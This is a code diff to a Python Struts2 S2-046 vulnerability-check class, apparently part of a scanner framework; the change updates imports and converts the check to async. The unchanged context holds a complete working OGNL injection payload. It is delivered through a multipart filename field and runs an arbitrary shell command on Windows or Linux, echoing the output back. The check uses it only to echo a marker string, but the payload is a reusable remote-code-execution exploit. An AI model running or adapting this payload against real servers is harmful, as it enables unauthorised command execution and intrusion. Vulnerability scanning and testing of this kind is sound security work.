@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
-from app.lib.utils.request import request
-from app.lib.utils.common import get_capta, get_useragent
+from app.lib.request import request
+from app.lib.common import get_capta, get_useragent
 
 class S2_046_BaseVerify:
     def __init__(self, url):
@@ -24,7 +24,7 @@ class S2_046_BaseVerify:
         self.payload = '''%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='CMD').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}'''
         self.post_data = '''-----------------------------735323031399963166993862150\r\nContent-Disposition: form-data; name=\"foo\"; filename="{payload}\0b\"\r\nContent-Type: text/plain\r\n\r\nx\r\n-----------------------------735323031399963166993862150--'''
     
-    def check(self):
+    async def check(self):
 
         """
         检测是否存在漏洞
@@ -35,15 +35,12 @@ class S2_046_BaseVerify:
         
         try:
             self.check_payload = self.payload.replace('CMD', 'echo ' + self.capta)
-            check_req = request.post(self.url, headers = self.headers, data = self.post_data.format(payload = self.check_payload))
-            if self.capta in check_req.text and len(check_req.text) < 100:
+            check_req = await request.post(self.url, headers = self.headers, data = self.post_data.format(payload = self.check_payload))
+            if self.capta in await check_req.text() and len(await check_req.text()) < 100:
                 return True
-            else:
-                return False
+            
         except Exception as e:
-            print(e)
-            return False
-        finally:
+            # print(e)
             pass
 
 if  __name__ == "__main__":
